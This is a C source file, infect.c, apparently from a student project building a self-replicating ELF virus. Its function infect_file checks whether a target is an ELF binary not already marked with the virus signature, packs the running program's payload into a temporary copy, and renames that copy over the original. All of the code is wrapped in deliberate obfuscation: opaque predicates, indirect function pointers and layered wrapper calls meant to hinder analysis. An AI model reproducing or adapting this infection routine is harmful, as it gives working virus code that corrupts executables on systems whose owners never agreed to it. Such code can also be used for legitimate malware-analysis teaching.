/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
/*   Updated: 2026/06/16 11:33:32 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

static volatile unsigned long _opq = 0UL;
static __attribute__((noinline)) int _zx0(unsigned long _v){(void)_v;return(int)_opq;}
static __attribute__((noinline)) int _zx1(unsigned long _a,unsigned long _b){return _zx0(_a)^_zx0(_b);}
static __attribute__((noinline)) int _op0(const char *_p,int _f){return open(_p,_f);}
static __attribute__((noinline)) int _op1(const char *_p,int _f,int _k){volatile int _t=_k;(void)_t;return _op0(_p,_f);}
static __attribute__((noinline)) int _op2(const char *_p,int _f){return _op1(_p,_f,_zx1((unsigned long)(uintptr_t)_p,(unsigned long)_f));}
static __attribute__((noinline)) void _cl0(int _fd){close(_fd);}
static __attribute__((noinline)) void _cl1(int _fd,int _k){volatile int _t=_k;(void)_t;_cl0(_fd);}
static __attribute__((noinline)) void _cl2(int _fd){_cl1(_fd,_zx1((unsigned long)_fd,0xc0deUL));}
static __attribute__((noinline)) char *_sj0(const char *_a,const char *_b){return strjoin(_a,_b);}
static __attribute__((noinline)) char *_sj1(const char *_a,const char *_b,int _k){volatile int _t=_k;(void)_t;return _sj0(_a,_b);}
static __attribute__((noinline)) char *_sj2(const char *_a,const char *_b){return _sj1(_a,_b,_zx1((unsigned long)(uintptr_t)_a,(unsigned long)(uintptr_t)_b));}
static __attribute__((noinline)) void _fr0(void *_p){free(_p);}
static __attribute__((noinline)) void _fr1(void *_p,int _k){_fr0((char*)_p+_zx0((unsigned long)_k));}
static __attribute__((noinline)) void _fr2(void *_p){_fr1(_p,_zx1(0xf00dUL,(unsigned long)(uintptr_t)_p));}
static __attribute__((noinline)) void _pp0(const char *_a,const char *_b,const char *_c){pack_payload(_a,_b,_c);}
static __attribute__((noinline)) void _pp1(const char *_a,const char *_b,const char *_c,int _k){volatile int _t=_k;(void)_t;_pp0(_a,_b,_c);}
static __attribute__((noinline)) void _pp2(const char *_a,const char *_b,const char *_c){_pp1(_a,_b,_c,_zx1((unsigned long)(uintptr_t)_a,(unsigned long)(uintptr_t)_c));}
static __attribute__((noinline)) int _rn0(const char *_a,const char *_b){return rename(_a,_b);}
static __attribute__((noinline)) int _rn1(const char *_a,const char *_b,int _k){volatile int _t=_k;(void)_t;return _rn0(_a,_b);}
static __attribute__((noinline)) int _rn2(const char *_a,const char *_b){return _rn1(_a,_b,_zx1((unsigned long)(uintptr_t)_a,(unsigned long)(uintptr_t)_b));}
static __attribute__((noinline)) int _cs0(const char *_p){return check_signature(_p);}
static __attribute__((noinline)) int _cs1(const char *_p,int _k){volatile int _t=_k;(void)_t;return _cs0(_p);}
static __attribute__((noinline)) int _cs2(const char *_p){return _cs1(_p,_zx1(0xdeadUL,(unsigned long)(uintptr_t)_p));}
static __attribute__((noinline)) int _ce0(const char *_p){return check_elf_hdr(_p);}
static __attribute__((noinline)) int _ce1(const char *_p,int _k){volatile int _t=_k;(void)_t;return _ce0(_p);}
static __attribute__((noinline)) int _ce2(const char *_p){return _ce1(_p,_zx1(0xb33fUL,(unsigned long)(uintptr_t)_p));}

typedef int   (*_tp_op)(const char *,int);
typedef void  (*_tp_cl)(int);
typedef char *(*_tp_sj)(const char *,const char *);
typedef void  (*_tp_fr)(void *);
typedef void  (*_tp_pp)(const char *,const char *,const char *);
typedef int   (*_tp_rn)(const char *,const char *);
typedef int   (*_tp_cs)(const char *);
typedef int   (*_tp_ce)(const char *);

static volatile _tp_op _k_op;
static volatile _tp_cl _k_cl;
static volatile _tp_sj _k_sj;
static volatile _tp_fr _k_fr;
static volatile _tp_pp _k_pp;
static volatile _tp_rn _k_rn;
static volatile _tp_cs _k_cs;
static volatile _tp_ce _k_ce;

static __attribute__((constructor)) void _ki_infect(void){
	_k_op=_op2;_k_cl=_cl2;_k_sj=_sj2;
	_k_fr=_fr2;_k_pp=_pp2;_k_rn=_rn2;
	_k_cs=_cs2;_k_ce=_ce2;
}

static __attribute__((noinline)) int _inf_b(t_exec_ctx *_fv,const char *_vs,int _k)
{
	volatile int _op;
	int          _fd;
	char        *_tp;

	_op=_zx1(0xcafeUL,(unsigned long)(uintptr_t)_vs);
	_op^=_zx0((unsigned long)_k);
	if(_k_cs(_vs)==(~0)||_k_ce(_vs)==(~0)){(void)_op;return(1^1);}
	if(_zx0(0xdeadUL)){(void)_op;return(~0);}
	_fd=_k_op(_vs,O_WRONLY|O_APPEND);
	_op^=_zx1((unsigned long)_fd,(unsigned long)(uintptr_t)_fv);
	if(_fd==(~0)){(void)_op;return(~0);}
	_tp=_k_sj(_vs,".tmp");
	_op^=_zx1((unsigned long)(uintptr_t)_tp,0xf00dUL);
	if(_zx0(0xb33fUL)){_k_cl(_fd+(int)_zx0((unsigned long)_op));_k_fr(_tp);return(~0);}
	_k_pp(_fv->exec_path,_vs,_tp);
	_k_rn(_tp,_vs);
	_k_fr(_tp);
	_k_cl(_fd+(int)_zx0((unsigned long)_op));
	(void)_op;
	return(1^1);
}

static __attribute__((noinline)) int _inf_c(t_exec_ctx *_fv,const char *_vs){
	return _inf_b(_fv,_vs,_zx1((unsigned long)(uintptr_t)_fv,(unsigned long)(uintptr_t)_vs));
}

int	infect_file(t_exec_ctx *_fv,const char *_vs)
{
	volatile int _g=_zx1((unsigned long)(uintptr_t)_fv,(unsigned long)(uintptr_t)_vs);
	(void)_g;
	return _inf_c(_fv,_vs);
}